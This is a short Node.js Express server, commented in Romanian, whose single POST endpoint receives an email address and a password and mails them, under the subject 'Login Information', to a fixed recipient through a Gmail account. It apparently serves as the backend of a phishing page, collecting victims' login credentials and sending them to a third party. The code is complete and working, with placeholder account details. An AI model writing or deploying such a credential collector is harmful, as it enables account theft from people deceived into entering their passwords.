const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3000; // Folosește portul din variabilele de mediu sau portul 3000

// Middleware pentru parsarea cererilor de tip JSON
app.use(bodyParser.json());

// Configurează transportul de emailuri cu Nodemailer
let transporter = nodemailer.createTransport({
  service: 'gmail', // Sau alt serviciu (Yahoo, Outlook, etc.)
  auth: {
    user: 'adresa_ta_de_email@gmail.com', // Adresa ta de email
    pass: 'parola_ta' // Parola sau App Password, dacă ai 2FA activat
  }
});

// Endpoint pentru trimiterea emailurilor
app.post('/send-email', (req, res) => {
  const { email, password } = req.body;

  let mailOptions = {
    from: 'adresa_ta_de_email@gmail.com',
    to: 'adresa_destinatarului@example.com', // Emailul destinatarului
    subject: 'Login Information',
    text: `Email: ${email}\nPassword: ${password}`
  };

  // Trimite emailul
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send('Eroare la trimiterea emailului.');
    } else {
      console.log('Email trimis: ' + info.response);
      res.status(200).send('Email trimis cu succes!');
    }
  });
});

// Pornește serverul
app.listen(port, () => {
  console.log(`Serverul rulează pe portul ${port}`);
});
